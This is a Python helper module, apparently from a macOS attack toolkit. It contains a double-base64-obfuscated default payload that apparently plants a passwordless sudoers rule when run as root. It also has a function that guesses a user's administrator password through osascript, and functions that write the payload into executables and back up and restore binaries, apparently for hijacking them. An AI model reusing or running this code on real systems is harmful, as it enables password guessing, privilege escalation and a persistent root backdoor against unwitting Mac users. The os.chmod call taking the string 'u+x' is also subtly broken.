"""general config and functions"""
import os
import uuid
from distutils.version import LooseVersion
from getpass import getuser
from plistlib import readPlist
from subprocess import PIPE, Popen
from xml.parsers.expat import ExpatError

try:
    input = raw_input
except NameError:
    pass

DEFAULT_COMMAND = """python -c \\"$(echo aW1wb3J0IGJhc2U2NCwgb3M7IGV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYVdZZ2IzTXVaMlYwZFdsa0tDa2dQVDBnTURvZ2IzTXVjM2x6ZEdWdEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb0oxcFhUbTlpZVVGcFVWVjRUVWxGUmsxVVJEQnZVVlY0VFV0VFFrOVVNVUpDVlRGT1dGSkViMmRSVlhoTlNXbEJLMUJwUVhaYVdGSnFURE5PTVZwSE9XeGpiazA5SnlrcERRcGxiSE5sT2lCd2NtbHVkQ2hpWVhObE5qUXVZalkwWkdWamIyUmxLQ2RXV0U1c1kybENjR041UW5WaU0xRm5ZMjA1ZG1SQlBUMG5LU2s9Jykp | base64 -D)\\" """  # noqa: E501
USER = getuser()


def random_string():
    """generates random string"""
    return str(uuid.uuid4())[:8]


def default_browser():
    """gets default browser"""
    try:
        plist = readPlist(
            os.path.expanduser("~")
            + "/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist"
        )
    except ExpatError:
        return
    handlers = plist.get("LSHandlers")
    for handler in handlers:
        scheme = handler.get("LSHandlerURLScheme")
        if scheme and scheme in ["https", "http"]:
            return handler.get("LSHandlerRoleAll")
    return


def interaction_prompt(prompt):
    """"""
    return (
        input("\n[USER INTERACTION] {prompt} (y/N): ".format(prompt=prompt))[0].lower()
        == "y"
    )


def app_installed(app_name):
    """checks if app installed"""
    paths = ["/Applications/" + app_name, "~/Applications/" + app_name]
    for path in paths:
        if os.path.isdir(path):
            return path
    return


def app_running(app_name):
    """checks if app running"""
    return (
        not os.system('pgrep -f "{app_name}" > /dev/null'.format(app_name=app_name))
        == 256
    )


def app_info(app_name):
    """gets app info"""
    app_path = app_installed(app_name)
    try:
        return readPlist(app_path + "/Contents/Info.plist")
    except ExpatError:
        return


def app_version(app_name):
    """checks app version"""
    app_path = app_installed(app_name)
    try:
        plist = readPlist(app_path + "/Contents/Info.plist")
    except ExpatError:
        return
    return LooseVersion(plist.get("CFBundleVersion"))


def kill_app(app_path):
    """kills app"""
    os.system("pkill -f {app_path}".format(app_path=app_path))


def osascript(command):
    """runs shell for osascript"""
    osa = Popen([command], shell=True, stdout=PIPE, stderr=PIPE)
    response = osa.communicate()[0].strip()
    if isinstance(response, bytes):
        return response.decode("utf-8")
    return response


def get_values(i_obj):
    """gets values recursively"""
    values = list()
    if isinstance(i_obj, list):
        t_values = i_obj
    elif isinstance(i_obj, dict):
        t_values = i_obj.values()
    for t_value in t_values:
        if isinstance(t_value, dict):
            values.extend(get_values(t_value))
        elif isinstance(t_value, list):
            values.extend(t_value)
        else:
            values.append(str(t_value))
    return values


def try_password(password, user=USER):
    """tries user passwords"""
    rand = random_string()
    payload = """osascript <<END
      set command to "echo {success}"
      return do shell script command user name "{user}" password "{password}" with administrator privileges
    END""".format(
        success=rand, user=user, password=password
    )
    response = osascript(payload)
    return rand in response


def generates_bin(
    bin_path, command=DEFAULT_COMMAND, shebang="#!/bin/bash", chmod="u+x"
):
    """generates executable"""
    with open(bin_path, "w") as bin_file:
        bin_file.write(shebang)
        bin_file.write(command)
    os.chmod(bin_path, chmod)
    return bin_path


def backup_bin(bin_path, extension=".bak"):
    """backups executable"""
    backup_path = bin_path + extension
    os.rename(bin_path, backup_path)
    return backup_path


def restore_bin(backup_path, extension=".bak"):
    """backups executable"""
    restore_path = backup_path.replace(extension, "")
    os.rename(backup_path, restore_path)
    return restore_path
